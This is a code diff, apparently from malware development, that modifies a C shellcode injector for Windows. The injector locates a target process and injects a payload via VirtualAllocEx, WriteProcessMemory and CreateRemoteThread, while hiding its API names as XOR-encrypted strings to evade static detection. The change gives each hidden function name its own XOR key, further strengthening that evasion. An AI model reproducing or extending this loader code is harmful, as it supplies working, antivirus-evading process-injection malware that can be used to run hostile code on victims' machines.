@@ -42,7 +42,14 @@ unsigned int s_k32_len = sizeof(s_k32);
 // keys
 char my_payload_key[] = "";
 char my_proc_key[] = "";
-char f_key[] = "";
+char s_vaex_key[] = "";
+char s_cth_key[] = "";
+char s_wfso_key[] = "";
+char s_wpm_key[] = "";
+char s_op_key[] = "";
+char s_clh_key[] = "";
+char s_p32f_key[] = "";
+char s_p32n_key[] = "";
 char k32_key[] = "";
 
 LPVOID (WINAPI * pVirtualAllocEx)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD  flAllocationType, DWORD  flProtect);
@@ -86,10 +93,10 @@ int FindTarget(const char *procname) {
         PROCESSENTRY32 pe32;
         int pid = 0;
 
-        XOR((char *) s_p32f, s_p32f_len, f_key, sizeof(f_key));
+        XOR((char *) s_p32f, s_p32f_len, s_p32f_key, sizeof(s_p32f_key));
         pProcess32First = GetProcAddress(GetModuleHandle(s_k32), s_p32f);
 
-        XOR((char *) s_p32n, s_p32n_len, f_key, sizeof(f_key));
+        XOR((char *) s_p32n, s_p32n_len, s_p32n_key, sizeof(s_p32n_key));
         pProcess32Next = GetProcAddress(GetModuleHandle(s_k32), s_p32n);
 
         hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
@@ -121,23 +128,23 @@ int Inject(HANDLE hProc, unsigned char * payload, unsigned int payload_len) {
         HANDLE hThread = NULL;
 
         // decrypt VirtualAllocEx function call
-        XOR((char *) s_vaex, s_vaex_len, f_key, sizeof(f_key));
+        XOR((char *) s_vaex, s_vaex_len, s_vaex_key, sizeof(s_vaex_key));
         pVirtualAllocEx = GetProcAddress(GetModuleHandle(s_k32), s_vaex);
         pRemoteCode = pVirtualAllocEx(hProc, NULL, my_payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
 
         // decrypt WriteProcessMemory function call
-        XOR((char *) s_wpm, s_wpm_len, f_key, sizeof(f_key));
+        XOR((char *) s_wpm, s_wpm_len, s_wpm_key, sizeof(s_wpm_key));
         pWriteProcessMemory = GetProcAddress(GetModuleHandle(s_k32), s_wpm);
         pWriteProcessMemory(hProc, pRemoteCode, (PVOID)payload, (SIZE_T)payload_len, (SIZE_T *)NULL);
 
         // decrypt CreateRemoteThread function call
-        XOR((char *) s_cth, s_cth_len, f_key, sizeof(f_key));
+        XOR((char *) s_cth, s_cth_len, s_cth_key, sizeof(s_cth_key));
         pCreateRemoteThread = GetProcAddress(GetModuleHandle(s_k32), s_cth);
         hThread = pCreateRemoteThread(hProc, NULL, 0, pRemoteCode, NULL, 0, NULL);
 
         if (hThread != NULL) {
                 // decrypt WaitForSingleObject function call
-                XOR((char *) s_wfso, s_wfso_len, f_key, sizeof(f_key));
+                XOR((char *) s_wfso, s_wfso_len, s_wfso_key, sizeof(s_wfso_key));
                 pWaitForSingleObject = GetProcAddress(GetModuleHandle(s_k32), s_wfso);
                 pWaitForSingleObject(hThread, 500);
 
@@ -157,7 +164,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     XOR((char *) s_k32, s_k32_len, k32_key, sizeof(k32_key));
 
     // decrypt CloseHandle function call
-    XOR((char *) s_clh, s_clh_len, f_key, sizeof(f_key));
+    XOR((char *) s_clh, s_clh_len, s_clh_key, sizeof(s_clh_key));
     pCloseHandle = GetProcAddress(GetModuleHandle(s_k32), s_clh);
 
     // decrypt process name
@@ -167,7 +174,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 
     if (pid) {
         // decrypt OpenProcess function call
-        XOR((char *) s_op, s_op_len, f_key, sizeof(f_key));
+        XOR((char *) s_op, s_op_len, s_op_key, sizeof(s_op_key));
         pOpenProcess = GetProcAddress(GetModuleHandle(s_k32), s_op);
 
         // try to open target process
